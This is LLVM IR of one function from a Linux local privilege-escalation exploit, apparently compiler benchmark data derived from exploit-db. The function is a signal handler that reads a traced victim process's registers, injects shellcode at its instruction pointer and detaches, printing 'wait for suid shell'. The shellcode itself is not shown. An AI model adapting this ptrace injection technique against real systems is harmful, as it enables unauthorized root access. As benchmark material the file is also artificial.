; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_3.c_sigchld.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_3.c_sigchld.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.user_regs_struct = type { i64 }

@gotchild = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [19 x i8] c"[+] Signal caught\0A\00", align 1
@PTRACE_GETREGS = common dso_local global i32 0, align 4
@victim = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [29 x i8] c"[-] Unable to read registers\00", align 1
@.str.2 = private unnamed_addr constant [33 x i8] c"[+] Shellcode placed at 0x%08lx\0A\00", align 1
@.str.3 = private unnamed_addr constant [32 x i8] c"[+] Now wait for suid shell...\0A\00", align 1
@PTRACE_DETACH = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [33 x i8] c"[-] Unable to detach from victim\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @sigchld(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.user_regs_struct, align 8
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* @gotchild, align 4
  %5 = add nsw i32 %4, 1
  store i32 %5, i32* @gotchild, align 4
  %6 = icmp eq i32 %4, 0
  br i1 %6, label %7, label %8

7:                                                ; preds = %1
  ret void

8:                                                ; preds = %1
  %9 = load i32, i32* @stderr, align 4
  %10 = call i32 (i32, i8*, ...) @fprintf(i32 %9, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str, i64 0, i64 0))
  %11 = load i32, i32* @PTRACE_GETREGS, align 4
  %12 = load i32, i32* @victim, align 4
  %13 = call i32 @ptrace(i32 %11, i32 %12, i32* null, %struct.user_regs_struct* %3)
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %17

15:                                               ; preds = %8
  %16 = call i32 @fatal(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0))
  br label %17

17:                                               ; preds = %15, %8
  %18 = load i32, i32* @stderr, align 4
  %19 = getelementptr inbounds %struct.user_regs_struct, %struct.user_regs_struct* %3, i32 0, i32 0
  %20 = load i64, i64* %19, align 8
  %21 = call i32 (i32, i8*, ...) @fprintf(i32 %18, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.2, i64 0, i64 0), i64 %20)
  %22 = getelementptr inbounds %struct.user_regs_struct, %struct.user_regs_struct* %3, i32 0, i32 0
  %23 = load i64, i64* %22, align 8
  %24 = inttoptr i64 %23 to i64*
  %25 = call i32 @putcode(i64* %24)
  %26 = load i32, i32* @stderr, align 4
  %27 = call i32 (i32, i8*, ...) @fprintf(i32 %26, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0))
  %28 = load i32, i32* @PTRACE_DETACH, align 4
  %29 = load i32, i32* @victim, align 4
  %30 = call i32 @ptrace(i32 %28, i32 %29, i32* null, %struct.user_regs_struct* null)
  %31 = icmp eq i32 %30, -1
  br i1 %31, label %32, label %34

32:                                               ; preds = %17
  %33 = call i32 @fatal(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.4, i64 0, i64 0))
  br label %34

34:                                               ; preds = %32, %17
  %35 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @ptrace(i32, i32, i32*, %struct.user_regs_struct*) #1

declare dso_local i32 @fatal(i8*) #1

declare dso_local i32 @putcode(i64*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
